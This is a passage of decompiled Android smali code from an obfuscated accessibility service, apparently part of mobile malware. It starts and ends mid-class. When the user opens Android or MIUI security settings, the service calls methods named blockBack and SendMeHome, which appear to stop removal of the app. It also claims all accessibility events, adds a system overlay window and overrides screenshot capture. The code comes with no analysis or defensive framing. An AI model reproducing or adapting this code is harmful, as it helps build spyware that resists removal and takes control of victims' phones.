    if-nez v2, :cond_57

    const-string v2, "android.widget.framelayout"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_59

    .line 1290
    :cond_57
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "com.android.settings"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_58

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "com.miui.securitycenter"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_59

    .line 1291
    :cond_58
    invoke-direct/range {p0 .. p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_59

    .line 1296
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V

    .line 1297
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendMeHome()V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_9

    :catch_9
    :cond_59
    return-void
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method public onServiceConnected()V
    .locals 9

    .line 2167
    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    .line 2171
    :try_start_0
    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    const/16 v1, 0x13

    .line 2172
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    const/4 v1, -0x1

    .line 2173
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    const-wide/16 v2, 0x1

    .line 2174
    iput-wide v2, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J

    const/4 v2, 0x0

    .line 2175
    iput-object v2, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->packageNames:[Ljava/lang/String;

    .line 2176
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    .line 2177
    invoke-virtual {p0, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 2182
    :catch_0
    :try_start_1
    sput-object p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->MyAccess:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    .line 2183
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getApplicationContext()Landroid/content/Context;

    const-string v0, "window"

    .line 2185
    invoke-virtual {p0, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    .line 2186
    new-instance v1, Landroid/widget/FrameLayout;

    invoke-direct {v1, p0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    .line 2188
    new-instance v8, Landroid/view/WindowManager$LayoutParams;

    const/4 v3, 0x1

    const/4 v4, 0x1

    const/16 v5, 0x7f0

    const v6, -0x7fb3fb68

    const/4 v7, -0x3

    move-object v2, v8

    invoke-direct/range {v2 .. v7}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const/16 v2, 0x30

    .line 2198
    iput v2, v8, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 2199
    sput-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112lay:Landroid/view/WindowManager$LayoutParams;

    .line 2200
    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112wm:Landroid/view/WindowManager;

    .line 2201
    invoke-interface {v0, v1, v8}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    .locals 0

    .line 513
    invoke-super {p0, p1, p2, p3}, Landroid/accessibilityservice/AccessibilityService;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    return-void
.end method
